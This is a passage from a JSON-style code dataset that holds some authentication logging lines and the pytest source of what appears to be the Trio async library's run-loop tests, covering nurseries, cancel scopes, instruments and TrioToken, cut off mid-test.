                        "                    logger.info(f'Authenticating with {\"username\" if self._user_info_cache.account_username else \"\"}, {\"password\" if password else \"\"}, {\"two_factor\" if two_factor else \"\"}')"
                    ],
                    [
                        194,
                        "                    logger.info(f\"Response from auth {ret_code}\")"
                    ],
                    [
                        187,
                        "                        logger.info(f\"Put {ret_code} in the queue, waiting for other side to receive\")"
                    ]
                ]
            }
        },
        "109": {
            "file": "import contextvars\nimport functools\nimport platform\nimport sys\nimport threading\nimport time\nimport types\nimport warnings\nfrom contextlib import contextmanager, ExitStack\nfrom math import inf\nfrom textwrap import dedent\nimport attr\nimport outcome\nimport sniffio\nimport pytest\nfrom async_generator import async_generator\nfrom .tutil import slow, check_sequence_matches, gc_collect_harder\nfrom ... import _core\nfrom ..._threads import to_thread_run_sync\nfrom ..._timeouts import sleep, fail_after\nfrom ..._util import aiter_compat\nfrom ...testing import (\n    wait_all_tasks_blocked,\n    Sequencer,\n    assert_checkpoints,\n)\nasync def sleep_forever():\n    return await _core.wait_task_rescheduled(lambda _: _core.Abort.SUCCEEDED)\n@contextmanager\ndef ignore_coroutine_never_awaited_warnings():\n    with warnings.catch_warnings():\n        warnings.filterwarnings(\n            \"ignore\", message=\"coroutine '.*' was never awaited\"\n        )\n        try:\n            yield\n        finally:\n            gc_collect_harder()\ndef test_basic():\n    async def trivial(x):\n        return x\n    assert _core.run(trivial, 8) == 8\n    with pytest.raises(TypeError):\n        _core.run(trivial)\n    with pytest.raises(TypeError):\n        _core.run(lambda: None)\n    async def trivial2(x):\n        await _core.checkpoint()\n        return x\n    assert _core.run(trivial2, 1) == 1\ndef test_initial_task_error():\n    async def main(x):\n        raise ValueError(x)\n    with pytest.raises(ValueError) as excinfo:\n        _core.run(main, 17)\n    assert excinfo.value.args == (17,)\ndef test_run_nesting():\n    async def inception():\n        async def main():  \n            pass\n        return _core.run(main)\n    with pytest.raises(RuntimeError) as excinfo:\n        _core.run(inception)\n    assert \"from inside\" in str(excinfo.value)\nasync def test_nursery_warn_use_async_with():\n    with pytest.raises(RuntimeError) as excinfo:\n        on = _core.open_nursery()\n        with on:\n            pass  \n    excinfo.match(\n        r\"use 'async with open_nursery\\(...\\)', not 'with open_nursery\\(...\\)'\"\n    )\n    async with on:\n        pass\nasync def test_nursery_main_block_error_basic():\n    exc = ValueError(\"whoops\")\n    with pytest.raises(ValueError) as excinfo:\n        async with _core.open_nursery():\n            raise exc\n    assert excinfo.value is exc\nasync def test_child_crash_basic():\n    exc = ValueError(\"uh oh\")\n    async def erroring():\n        raise exc\n    try:\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(erroring)\n    except ValueError as e:\n        assert e is exc\nasync def test_basic_interleave():\n    async def looper(whoami, record):\n        for i in range(3):\n            record.append((whoami, i))\n            await _core.checkpoint()\n    record = []\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(looper, \"a\", record)\n        nursery.start_soon(looper, \"b\", record)\n    check_sequence_matches(\n        record,\n        [{(\"a\", 0), (\"b\", 0)}, {(\"a\", 1), (\"b\", 1)}, {(\"a\", 2), (\"b\", 2)}]\n    )\ndef test_task_crash_propagation():\n    looper_record = []\n    async def looper():\n        try:\n            while True:\n                await _core.checkpoint()\n        except _core.Cancelled:\n            print(\"looper cancelled\")\n            looper_record.append(\"cancelled\")\n    async def crasher():\n        raise ValueError(\"argh\")\n    async def main():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(looper)\n            nursery.start_soon(crasher)\n    with pytest.raises(ValueError) as excinfo:\n        _core.run(main)\n    assert looper_record == [\"cancelled\"]\n    assert excinfo.value.args == (\"argh\",)\ndef test_main_and_task_both_crash():\n    async def crasher():\n        raise ValueError\n    async def main():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher)\n            raise KeyError\n    with pytest.raises(_core.MultiError) as excinfo:\n        _core.run(main)\n    print(excinfo.value)\n    assert {type(exc)\n            for exc in excinfo.value.exceptions} == {ValueError, KeyError}\ndef test_two_child_crashes():\n    async def crasher(etype):\n        raise etype\n    async def main():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher, KeyError)\n            nursery.start_soon(crasher, ValueError)\n    with pytest.raises(_core.MultiError) as excinfo:\n        _core.run(main)\n    assert {type(exc)\n            for exc in excinfo.value.exceptions} == {ValueError, KeyError}\nasync def test_child_crash_wakes_parent():\n    async def crasher():\n        raise ValueError\n    with pytest.raises(ValueError):\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher)\n            await sleep_forever()\nasync def test_reschedule():\n    t1 = None\n    t2 = None\n    async def child1():\n        nonlocal t1, t2\n        t1 = _core.current_task()\n        print(\"child1 start\")\n        x = await sleep_forever()\n        print(\"child1 woke\")\n        assert x == 0\n        print(\"child1 rescheduling t2\")\n        _core.reschedule(t2, outcome.Error(ValueError()))\n        print(\"child1 exit\")\n    async def child2():\n        nonlocal t1, t2\n        print(\"child2 start\")\n        t2 = _core.current_task()\n        _core.reschedule(t1, outcome.Value(0))\n        print(\"child2 sleep\")\n        with pytest.raises(ValueError):\n            await sleep_forever()\n        print(\"child2 successful exit\")\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(child1)\n        await _core.checkpoint()\n        nursery.start_soon(child2)\nasync def test_current_time():\n    t1 = _core.current_time()\n    time.sleep(time.get_clock_info(\"perf_counter\").resolution)\n    t2 = _core.current_time()\n    assert t1 < t2\nasync def test_current_time_with_mock_clock(mock_clock):\n    start = mock_clock.current_time()\n    assert mock_clock.current_time() == _core.current_time()\n    assert mock_clock.current_time() == _core.current_time()\n    mock_clock.jump(3.14)\n    assert start + 3.14 == mock_clock.current_time() == _core.current_time()\nasync def test_current_clock(mock_clock):\n    assert mock_clock is _core.current_clock()\nasync def test_current_task():\n    parent_task = _core.current_task()\n    async def child():\n        assert _core.current_task().parent_nursery.parent_task is parent_task\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(child)\nasync def test_root_task():\n    root = _core.current_root_task()\n    assert root.parent_nursery is None\ndef test_out_of_context():\n    with pytest.raises(RuntimeError):\n        _core.current_task()\n    with pytest.raises(RuntimeError):\n        _core.current_time()\nasync def test_current_statistics(mock_clock):\n    await wait_all_tasks_blocked()\n    async def child():\n        try:\n            await sleep_forever()\n        except _core.Cancelled:\n            pass\n    stats = _core.current_statistics()\n    print(stats)\n    assert stats.tasks_living == 3\n    assert stats.run_sync_soon_queue_size == 0\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(child)\n        await wait_all_tasks_blocked()\n        token = _core.current_trio_token()\n        token.run_sync_soon(lambda: None)\n        token.run_sync_soon(lambda: None, idempotent=True)\n        stats = _core.current_statistics()\n        print(stats)\n        assert stats.tasks_living == 4\n        assert stats.tasks_runnable == 0\n        assert stats.run_sync_soon_queue_size == 2\n        nursery.cancel_scope.cancel()\n        stats = _core.current_statistics()\n        print(stats)\n        assert stats.tasks_runnable == 1\n    await _core.checkpoint()\n    await _core.checkpoint()\n    with _core.CancelScope(deadline=_core.current_time() + 5):\n        stats = _core.current_statistics()\n        print(stats)\n        assert stats.seconds_to_next_deadline == 5\n    stats = _core.current_statistics()\n    print(stats)\n    assert stats.seconds_to_next_deadline == inf\n@attr.s(eq=False, hash=False)\nclass TaskRecorder:\n    record = attr.ib(factory=list)\n    def before_run(self):\n        self.record.append((\"before_run\",))\n    def task_scheduled(self, task):\n        self.record.append((\"schedule\", task))\n    def before_task_step(self, task):\n        assert task is _core.current_task()\n        self.record.append((\"before\", task))\n    def after_task_step(self, task):\n        assert task is _core.current_task()\n        self.record.append((\"after\", task))\n    def after_run(self):\n        self.record.append((\"after_run\",))\n    def filter_tasks(self, tasks):\n        for item in self.record:\n            if item[0] in (\"schedule\", \"before\", \"after\") and item[1] in tasks:\n                yield item\n            if item[0] in (\"before_run\", \"after_run\"):\n                yield item\ndef test_instruments(recwarn):\n    r1 = TaskRecorder()\n    r2 = TaskRecorder()\n    r3 = TaskRecorder()\n    task = None\n    async def task_fn():\n        nonlocal task\n        task = _core.current_task()\n        for _ in range(4):\n            await _core.checkpoint()\n        _core.remove_instrument(r2)\n        with pytest.raises(KeyError):\n            _core.remove_instrument(r2)\n        _core.add_instrument(r3)\n        _core.add_instrument(r3)\n        for _ in range(1):\n            await _core.checkpoint()\n    async def main():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(task_fn)\n    _core.run(main, instruments=[r1, r2])\n    expected = (\n        [(\"before_run\",), (\"schedule\", task)] +\n        [(\"before\", task), (\"schedule\", task), (\"after\", task)] * 5 +\n        [(\"before\", task), (\"after\", task), (\"after_run\",)]\n    )\n    assert len(r1.record) > len(r2.record) > len(r3.record)\n    assert r1.record == r2.record + r3.record\n    assert list(r1.filter_tasks([task])) == expected\ndef test_instruments_interleave():\n    tasks = {}\n    async def two_step1():\n        tasks[\"t1\"] = _core.current_task()\n        await _core.checkpoint()\n    async def two_step2():\n        tasks[\"t2\"] = _core.current_task()\n        await _core.checkpoint()\n    async def main():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(two_step1)\n            nursery.start_soon(two_step2)\n    r = TaskRecorder()\n    _core.run(main, instruments=[r])\n    expected = [\n        (\"before_run\",),\n        (\"schedule\", tasks[\"t1\"]),\n        (\"schedule\", tasks[\"t2\"]),\n        {\n            (\"before\", tasks[\"t1\"]),\n            (\"schedule\", tasks[\"t1\"]),\n            (\"after\", tasks[\"t1\"]),\n            (\"before\", tasks[\"t2\"]),\n            (\"schedule\", tasks[\"t2\"]),\n            (\"after\", tasks[\"t2\"])\n        },\n        {\n            (\"before\", tasks[\"t1\"]),\n            (\"after\", tasks[\"t1\"]),\n            (\"before\", tasks[\"t2\"]),\n            (\"after\", tasks[\"t2\"])\n        },\n        (\"after_run\",),\n    ]  \n    print(list(r.filter_tasks(tasks.values())))\n    check_sequence_matches(list(r.filter_tasks(tasks.values())), expected)\ndef test_null_instrument():\n    class NullInstrument:\n        pass\n    async def main():\n        await _core.checkpoint()\n    _core.run(main, instruments=[NullInstrument()])\ndef test_instrument_before_after_run():\n    record = []\n    class BeforeAfterRun:\n        def before_run(self):\n            record.append(\"before_run\")\n        def after_run(self):\n            record.append(\"after_run\")\n    async def main():\n        pass\n    _core.run(main, instruments=[BeforeAfterRun()])\n    assert record == [\"before_run\", \"after_run\"]\ndef test_instrument_task_spawn_exit():\n    record = []\n    class SpawnExitRecorder:\n        def task_spawned(self, task):\n            record.append((\"spawned\", task))\n        def task_exited(self, task):\n            record.append((\"exited\", task))\n    async def main():\n        return _core.current_task()\n    main_task = _core.run(main, instruments=[SpawnExitRecorder()])\n    assert (\"spawned\", main_task) in record\n    assert (\"exited\", main_task) in record\ndef test_instruments_crash(caplog):\n    record = []\n    class BrokenInstrument:\n        def task_scheduled(self, task):\n            record.append(\"scheduled\")\n            raise ValueError(\"oops\")\n        def close(self):\n            record.append(\"closed\")  \n    async def main():\n        record.append(\"main ran\")\n        return _core.current_task()\n    r = TaskRecorder()\n    main_task = _core.run(main, instruments=[r, BrokenInstrument()])\n    assert record == [\"scheduled\", \"main ran\"]\n    assert (\"after\", main_task) in r.record\n    assert (\"after_run\",) in r.record\n    exc_type, exc_value, exc_traceback = caplog.records[0].exc_info\n    assert exc_type is ValueError\n    assert str(exc_value) == \"oops\"\n    assert \"Instrument has been disabled\" in caplog.records[0].message\nasync def test_cancel_scope_repr(mock_clock):\n    scope = _core.CancelScope()\n    assert \"unbound\" in repr(scope)\n    with scope:\n        assert \"active\" in repr(scope)\n        scope.deadline = _core.current_time() - 1\n        assert \"deadline is 1.00 seconds ago\" in repr(scope)\n        scope.deadline = _core.current_time() + 10\n        assert \"deadline is 10.00 seconds from now\" in repr(scope)\n        assert \"deadline\" not in await to_thread_run_sync(repr, scope)\n        scope.cancel()\n        assert \"cancelled\" in repr(scope)\n    assert \"exited\" in repr(scope)\ndef test_cancel_points():\n    async def main1():\n        with _core.CancelScope() as scope:\n            await _core.checkpoint_if_cancelled()\n            scope.cancel()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint_if_cancelled()\n    _core.run(main1)\n    async def main2():\n        with _core.CancelScope() as scope:\n            await _core.checkpoint()\n            scope.cancel()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n    _core.run(main2)\n    async def main3():\n        with _core.CancelScope() as scope:\n            scope.cancel()\n            with pytest.raises(_core.Cancelled):\n                await sleep_forever()\n    _core.run(main3)\n    async def main4():\n        with _core.CancelScope() as scope:\n            scope.cancel()\n            await _core.cancel_shielded_checkpoint()\n            await _core.cancel_shielded_checkpoint()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n    _core.run(main4)\nasync def test_cancel_edge_cases():\n    with _core.CancelScope() as scope:\n        scope.cancel()\n        scope.cancel()\n        await _core.checkpoint()\n    assert scope.cancel_called\n    assert scope.cancelled_caught\n    with _core.CancelScope() as scope:\n        scope.cancel()\n        with pytest.raises(_core.Cancelled):\n            await sleep_forever()\n        with pytest.raises(_core.Cancelled):\n            await sleep_forever()\nasync def test_cancel_scope_multierror_filtering():\n    async def crasher():\n        raise KeyError\n    try:\n        with _core.CancelScope() as outer:\n            try:\n                async with _core.open_nursery() as nursery:\n                    nursery.start_soon(sleep_forever)  \n                    nursery.start_soon(sleep_forever)  \n                    nursery.cancel_scope.cancel()\n                    with _core.CancelScope(shield=True):\n                        await wait_all_tasks_blocked()\n                    nursery.start_soon(sleep_forever)  \n                    outer.cancel()\n                    nursery.start_soon(crasher)  \n            except _core.MultiError as multi_exc:\n                assert len(multi_exc.exceptions) == 5\n                summary = {}\n                for exc in multi_exc.exceptions:\n                    summary.setdefault(type(exc), 0)\n                    summary[type(exc)] += 1\n                assert summary == {_core.Cancelled: 4, KeyError: 1}\n                raise\n    except AssertionError:  \n        raise\n    except BaseException as exc:\n        assert type(exc) is KeyError\n    else:  \n        assert False\nasync def test_precancelled_task():\n    record = []\n    async def blocker():\n        record.append(\"started\")\n        await sleep_forever()\n    async with _core.open_nursery() as nursery:\n        nursery.cancel_scope.cancel()\n        nursery.start_soon(blocker)\n    assert record == [\"started\"]\nasync def test_cancel_shielding():\n    with _core.CancelScope() as outer:\n        with _core.CancelScope() as inner:\n            await _core.checkpoint()\n            outer.cancel()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n            assert inner.shield is False\n            with pytest.raises(TypeError):\n                inner.shield = \"hello\"\n            assert inner.shield is False\n            inner.shield = True\n            assert inner.shield is True\n            await _core.checkpoint()\n            with _core.CancelScope() as innerest:\n                innerest.cancel()\n                with pytest.raises(_core.Cancelled):\n                    await _core.checkpoint()\n            await _core.checkpoint()\n            inner.shield = False\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n            inner.shield = True\n            await _core.checkpoint()\n            inner.cancel()\n            await _core.checkpoint()\n        assert inner.cancelled_caught\nasync def test_cancel_inheritance():\n    record = set()\n    async def leaf(ident):\n        try:\n            await sleep_forever()\n        except _core.Cancelled:\n            record.add(ident)\n    async def worker(ident):\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(leaf, ident + \"-l1\")\n            nursery.start_soon(leaf, ident + \"-l2\")\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(worker, \"w1\")\n        nursery.start_soon(worker, \"w2\")\n        nursery.cancel_scope.cancel()\n    assert record == {\"w1-l1\", \"w1-l2\", \"w2-l1\", \"w2-l2\"}\nasync def test_cancel_shield_abort():\n    with _core.CancelScope() as outer:\n        async with _core.open_nursery() as nursery:\n            outer.cancel()\n            nursery.cancel_scope.shield = True\n            record = []\n            async def sleeper():\n                record.append(\"sleeping\")\n                try:\n                    await sleep_forever()\n                except _core.Cancelled:\n                    record.append(\"cancelled\")\n            nursery.start_soon(sleeper)\n            await wait_all_tasks_blocked()\n            assert record == [\"sleeping\"]\n            nursery.cancel_scope.shield = False\n            with _core.CancelScope(shield=True):\n                await wait_all_tasks_blocked()\n                assert record == [\"sleeping\", \"cancelled\"]\nasync def test_basic_timeout(mock_clock):\n    start = _core.current_time()\n    with _core.CancelScope() as scope:\n        assert scope.deadline == inf\n        scope.deadline = start + 1\n        assert scope.deadline == start + 1\n    assert not scope.cancel_called\n    mock_clock.jump(2)\n    await _core.checkpoint()\n    await _core.checkpoint()\n    await _core.checkpoint()\n    assert not scope.cancel_called\n    start = _core.current_time()\n    with _core.CancelScope(deadline=start + 1) as scope:\n        mock_clock.jump(2)\n        await sleep_forever()\n    assert scope.cancel_called\n    assert scope.cancelled_caught\n    start = _core.current_time()\n    with _core.CancelScope() as scope:\n        await _core.checkpoint()\n        scope.deadline = start + 10\n        await _core.checkpoint()\n        mock_clock.jump(5)\n        await _core.checkpoint()\n        scope.deadline = start + 1\n        with pytest.raises(_core.Cancelled):\n            await _core.checkpoint()\n        with pytest.raises(_core.Cancelled):\n            await _core.checkpoint()\n@pytest.mark.filterwarnings(\n    \"ignore:.*trio.open_cancel_scope:trio.TrioDeprecationWarning\"\n)\nasync def test_cancel_scope_deprecated(recwarn):\n    assert isinstance(_core.open_cancel_scope(), _core.CancelScope)\nasync def test_cancel_scope_nesting():\n    with _core.CancelScope() as scope1:\n        with _core.CancelScope() as scope2:\n            with _core.CancelScope() as scope3:\n                scope3.cancel()\n                scope2.cancel()\n                await sleep_forever()\n    assert scope3.cancel_called\n    assert not scope3.cancelled_caught\n    assert scope2.cancel_called\n    assert scope2.cancelled_caught\n    assert not scope1.cancel_called\n    assert not scope1.cancelled_caught\n    with _core.CancelScope() as scope1:\n        with _core.CancelScope() as scope2:\n            scope1.cancel()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n            scope2.shield = True\n            await _core.checkpoint()\n            scope2.cancel()\n            with pytest.raises(_core.Cancelled):\n                await _core.checkpoint()\n    with _core.CancelScope() as scope:\n        scope.cancel()\n        await _core.cancel_shielded_checkpoint()\n    await _core.checkpoint()\n    assert not scope.cancelled_caught\nasync def test_unshield_while_cancel_propagating():\n    with _core.CancelScope() as outer:\n        with _core.CancelScope() as inner:\n            outer.cancel()\n            try:\n                await _core.checkpoint()\n            finally:\n                inner.shield = True\n    assert outer.cancelled_caught and not inner.cancelled_caught\nasync def test_cancel_unbound():\n    async def sleep_until_cancelled(scope):\n        with scope, fail_after(1):\n            await sleep_forever()\n    scope = _core.CancelScope()\n    scope.cancel()\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(sleep_until_cancelled, scope)\n    scope = _core.CancelScope()\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(sleep_until_cancelled, scope)\n        await wait_all_tasks_blocked()\n        scope.cancel()\n    scope = _core.CancelScope()\n    scope.shield = True\n    with _core.CancelScope() as outer, scope:\n        outer.cancel()\n        await _core.checkpoint()\n        scope.shield = False\n        with pytest.raises(_core.Cancelled):\n            await _core.checkpoint()\n    with _core.CancelScope() as scope:\n        await _core.checkpoint()\n    scope.cancel()\n    await _core.checkpoint()\n    assert scope.cancel_called\n    assert not scope.cancelled_caught\n    with pytest.raises(RuntimeError) as exc_info:\n        with scope:\n            pass  \n    assert \"single 'with' block\" in str(exc_info.value)\n    with _core.CancelScope() as scope:\n        with pytest.raises(RuntimeError) as exc_info:\n            with scope:\n                pass  \n        assert \"single 'with' block\" in str(exc_info.value)\n    scope = _core.CancelScope()\n    async def enter_scope():\n        with scope:\n            await sleep_forever()\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(enter_scope, name=\"this one\")\n        await wait_all_tasks_blocked()\n        with pytest.raises(RuntimeError) as exc_info:\n            with scope:\n                pass  \n        assert \"single 'with' block\" in str(exc_info.value)\n        nursery.cancel_scope.cancel()\n    scope = _core.CancelScope(deadline=_core.current_time() + 1)\n    assert not scope.cancel_called\n    scope.deadline -= 1\n    assert scope.cancel_called\n    scope.deadline += 1\n    assert scope.cancel_called  \nasync def test_cancel_scope_misnesting():\n    outer = _core.CancelScope()\n    inner = _core.CancelScope()\n    with ExitStack() as stack:\n        stack.enter_context(outer)\n        with inner:\n            with pytest.raises(RuntimeError, match=\"still within its child\"):\n                stack.close()\n    async def task1():\n        with pytest.raises(_core.Cancelled):\n            await sleep_forever()\n    async def task2():\n        with _core.CancelScope():\n            with pytest.raises(_core.Cancelled):\n                await sleep_forever()\n    with ExitStack() as stack:\n        stack.enter_context(_core.CancelScope())\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(task1)\n            nursery.start_soon(task2)\n            await wait_all_tasks_blocked()\n            with pytest.raises(RuntimeError, match=\"still within its child\"):\n                stack.close()\n    nursery_mgr = _core.open_nursery()\n    nursery = await nursery_mgr.__aenter__()\n    try:\n        nursery.start_soon(task1)\n        nursery.start_soon(task2)\n        nursery.start_soon(sleep_forever)\n        await wait_all_tasks_blocked()\n        nursery.cancel_scope.__exit__(None, None, None)\n    finally:\n        with pytest.raises(RuntimeError) as exc_info:\n            await nursery_mgr.__aexit__(*sys.exc_info())\n        assert \"which had already been exited\" in str(exc_info.value)\n        assert type(exc_info.value.__context__) is _core.MultiError\n        assert len(exc_info.value.__context__.exceptions) == 3\n        cancelled_in_context = False\n        for exc in exc_info.value.__context__.exceptions:\n            assert isinstance(exc, RuntimeError)\n            assert \"closed before the task exited\" in str(exc)\n            cancelled_in_context |= isinstance(\n                exc.__context__, _core.Cancelled\n            )\n        assert cancelled_in_context  \n    async def task3(task_status):\n        with _core.CancelScope() as scope:\n            task_status.started(scope)\n            await sleep_forever()\n    async with _core.open_nursery() as nursery:\n        scope = await nursery.start(task3)\n        with pytest.raises(RuntimeError, match=\"from unrelated\"):\n            scope.__exit__(None, None, None)\n        scope.cancel()\n@slow\nasync def test_timekeeping():\n    TARGET = 1.0\n    for _ in range(4):\n        real_start = time.perf_counter()\n        with _core.CancelScope() as scope:\n            scope.deadline = _core.current_time() + TARGET\n            await sleep_forever()\n        real_duration = time.perf_counter() - real_start\n        accuracy = real_duration / TARGET\n        print(accuracy)\n        if 1.0 <= accuracy < 2:  \n            break\n    else:  \n        assert False\nasync def test_failed_abort():\n    stubborn_task = [None]\n    stubborn_scope = [None]\n    record = []\n    async def stubborn_sleeper():\n        stubborn_task[0] = _core.current_task()\n        with _core.CancelScope() as scope:\n            stubborn_scope[0] = scope\n            record.append(\"sleep\")\n            x = await _core.wait_task_rescheduled(lambda _: _core.Abort.FAILED)\n            assert x == 1\n            record.append(\"woke\")\n            try:\n                await _core.checkpoint_if_cancelled()\n            except _core.Cancelled:\n                record.append(\"cancelled\")\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(stubborn_sleeper)\n        await wait_all_tasks_blocked()\n        assert record == [\"sleep\"]\n        stubborn_scope[0].cancel()\n        await wait_all_tasks_blocked()\n        assert record == [\"sleep\"]\n        _core.reschedule(stubborn_task[0], outcome.Value(1))\n    assert record == [\"sleep\", \"woke\", \"cancelled\"]\ndef test_broken_abort():\n    async def main():\n        await _core.checkpoint()\n        await _core.checkpoint()\n        with _core.CancelScope() as scope:\n            scope.cancel()\n            await _core.wait_task_rescheduled(lambda _: None)\n    with pytest.raises(_core.TrioInternalError):\n        _core.run(main)\n    gc_collect_harder()\ndef test_error_in_run_loop():\n    async def main():\n        task = _core.current_task()\n        task._schedule_points = \"hello!\"\n        await _core.checkpoint()\n    with ignore_coroutine_never_awaited_warnings():\n        with pytest.raises(_core.TrioInternalError):\n            _core.run(main)\nasync def test_spawn_system_task():\n    record = []\n    async def system_task(x):\n        record.append((\"x\", x))\n        record.append((\"ki\", _core.currently_ki_protected()))\n        await _core.checkpoint()\n    _core.spawn_system_task(system_task, 1)\n    await wait_all_tasks_blocked()\n    assert record == [(\"x\", 1), (\"ki\", True)]\ndef test_system_task_crash():\n    async def crasher():\n        raise KeyError\n    async def main():\n        _core.spawn_system_task(crasher)\n        await sleep_forever()\n    with pytest.raises(_core.TrioInternalError):\n        _core.run(main)\ndef test_system_task_crash_MultiError():\n    async def crasher1():\n        raise KeyError\n    async def crasher2():\n        raise ValueError\n    async def system_task():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher1)\n            nursery.start_soon(crasher2)\n    async def main():\n        _core.spawn_system_task(system_task)\n        await sleep_forever()\n    with pytest.raises(_core.TrioInternalError) as excinfo:\n        _core.run(main)\n    me = excinfo.value.__cause__\n    assert isinstance(me, _core.MultiError)\n    assert len(me.exceptions) == 2\n    for exc in me.exceptions:\n        assert isinstance(exc, (KeyError, ValueError))\ndef test_system_task_crash_plus_Cancelled():\n    async def crasher():\n        try:\n            await sleep_forever()\n        except _core.Cancelled:\n            raise ValueError\n    async def cancelme():\n        await sleep_forever()\n    async def system_task():\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher)\n            nursery.start_soon(cancelme)\n    async def main():\n        _core.spawn_system_task(system_task)\n    with pytest.raises(_core.TrioInternalError) as excinfo:\n        _core.run(main)\n    assert type(excinfo.value.__cause__) is ValueError\ndef test_system_task_crash_KeyboardInterrupt():\n    async def ki():\n        raise KeyboardInterrupt\n    async def main():\n        _core.spawn_system_task(ki)\n        await sleep_forever()\n    with pytest.raises(_core.TrioInternalError) as excinfo:\n        _core.run(main)\n    assert isinstance(excinfo.value.__cause__, KeyboardInterrupt)\nasync def test_yield_briefly_checks_for_timeout(mock_clock):\n    with _core.CancelScope(deadline=_core.current_time() + 5):\n        await _core.checkpoint()\n        with pytest.raises(_core.Cancelled):\n            mock_clock.jump(10)\n            await _core.checkpoint()\nasync def test_exc_info():\n    record = []\n    seq = Sequencer()\n    async def child1():\n        with pytest.raises(ValueError) as excinfo:\n            try:\n                async with seq(0):\n                    pass  \n                record.append(\"child1 raise\")\n                raise ValueError(\"child1\")\n            except ValueError:\n                record.append(\"child1 sleep\")\n                async with seq(2):\n                    pass\n                assert \"child2 wake\" in record\n                record.append(\"child1 re-raise\")\n                raise\n        assert excinfo.value.__context__ is None\n        record.append(\"child1 success\")\n    async def child2():\n        with pytest.raises(KeyError) as excinfo:\n            async with seq(1):\n                pass  \n            assert \"child1 sleep\" in record\n            record.append(\"child2 wake\")\n            assert sys.exc_info() == (None, None, None)\n            try:\n                raise KeyError(\"child2\")\n            except KeyError:\n                record.append(\"child2 sleep again\")\n                async with seq(3):\n                    pass\n                assert \"child1 re-raise\" in record\n                record.append(\"child2 re-raise\")\n                raise\n        assert excinfo.value.__context__ is None\n        record.append(\"child2 success\")\n    async with _core.open_nursery() as nursery:\n        nursery.start_soon(child1)\n        nursery.start_soon(child2)\n    assert record == [\n        \"child1 raise\", \"child1 sleep\", \"child2 wake\", \"child2 sleep again\",\n        \"child1 re-raise\", \"child1 success\", \"child2 re-raise\",\n        \"child2 success\"\n    ]\nasync def test_exc_info_after_yield_error():\n    child_task = None\n    async def child():\n        nonlocal child_task\n        child_task = _core.current_task()\n        try:\n            raise KeyError\n        except Exception:\n            try:\n                await sleep_forever()\n            except Exception:\n                pass\n            raise\n    with pytest.raises(KeyError):\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(child)\n            await wait_all_tasks_blocked()\n            _core.reschedule(child_task, outcome.Error(ValueError()))\nasync def test_exception_chaining_after_yield_error():\n    child_task = None\n    async def child():\n        nonlocal child_task\n        child_task = _core.current_task()\n        try:\n            raise KeyError\n        except Exception:\n            await sleep_forever()\n    with pytest.raises(ValueError) as excinfo:\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(child)\n            await wait_all_tasks_blocked()\n            _core.reschedule(child_task, outcome.Error(ValueError()))\n    assert isinstance(excinfo.value.__context__, KeyError)\nasync def test_nursery_exception_chaining_doesnt_make_context_loops():\n    async def crasher():\n        raise KeyError\n    with pytest.raises(_core.MultiError) as excinfo:\n        async with _core.open_nursery() as nursery:\n            nursery.start_soon(crasher)\n            raise ValueError\n    assert excinfo.value.__context__ is None\ndef test_TrioToken_identity():\n    async def get_and_check_token():\n        token = _core.current_trio_token()\n        assert token is _core.current_trio_token()\n        return token\n    t1 = _core.run(get_and_check_token)\n    t2 = _core.run(get_and_check_token)\n    assert t1 is not t2\n    assert t1 != t2\n    assert hash(t1) != hash(t2)\nasync def test_TrioToken_run_sync_soon_basic():\n    record = []\n    def cb(x):\n        record.append((\"cb\", x))\n    token = _core.current_trio_token()\n    token.run_sync_soon(cb, 1)\n    assert not record\n    await wait_all_tasks_blocked()\n    assert record == [(\"cb\", 1)]\ndef test_TrioToken_run_sync_soon_too_late():\n    token = None\n    async def main():\n        nonlocal token\n        token = _core.current_trio_token()\n    _core.run(main)\n    assert token is not None\n    with pytest.raises(_core.RunFinishedError):\n        token.run_sync_soon(lambda: None)  \nasync def test_TrioToken_run_sync_soon_idempotent():\n    record = []\n    def cb(x):\n        record.append(x)\n    token = _core.current_trio_token()\n    token.run_sync_soon(cb, 1)\n    token.run_sync_soon(cb, 1, idempotent=True)\n    token.run_sync_soon(cb, 1, idempotent=True)\n    token.run_sync_soon(cb, 1, idempotent=True)\n    token.run_sync_soon(cb, 2, idempotent=True)\n    token.run_sync_soon(cb, 2, idempotent=True)\n    await wait_all_tasks_blocked()\n    assert len(record) == 3\n    assert sorted(record) == [1, 1, 2]\n    record = []\n    for _ in range(3):\n        for i in range(100):\n            token.run_sync_soon(cb, i, idempotent=True)\n    await wait_all_tasks_blocked()\n    if (\n        sys.version_info < (3, 6)\n        and platform.python_implementation() == \"CPython\"\n    ):\n        record.sort()\n    assert record == list(range(100))\ndef test_TrioToken_run_sync_soon_idempotent_requeue():\n    record = []\n    def redo(token):\n        record.append(None)\n        try:\n            token.run_sync_soon(redo, token, idempotent=True)\n        except _core.RunFinishedError:\n            pass\n    async def main():\n        token = _core.current_trio_token()\n        token.run_sync_soon(redo, token, idempotent=True)\n        await _core.checkpoint()\n        await _core.checkpoint()\n        await _core.checkpoint()\n    